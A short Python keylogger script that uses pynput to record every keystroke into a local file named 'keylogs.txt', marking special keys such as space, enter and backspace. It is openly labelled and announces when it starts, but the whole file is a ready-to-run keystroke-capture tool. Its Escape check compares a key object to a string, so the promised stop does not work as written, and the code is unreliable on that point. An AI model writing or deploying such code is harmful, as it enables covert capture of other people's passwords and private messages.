from pynput.keyboard import Listener
log_file = "keylogs.txt"

def write_to_file(key):
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")  
        if key_data == "Key.space":
            file.write(" ")
        elif key_data == "Key.enter":
            file.write("\n")
        elif key_data == "Key.backspace":
            file.write(" [BACKSPACE] ")
        elif "Key" in key_data:
            file.write(f" [{key_data}] ")
        else:
            file.write(key_data)

def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")


def on_release(key):
    if key == "Key.esc":
        return False  

if __name__ == "__main__":
    print("Keylogger has started. Press 'Escape' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger has stopped.")
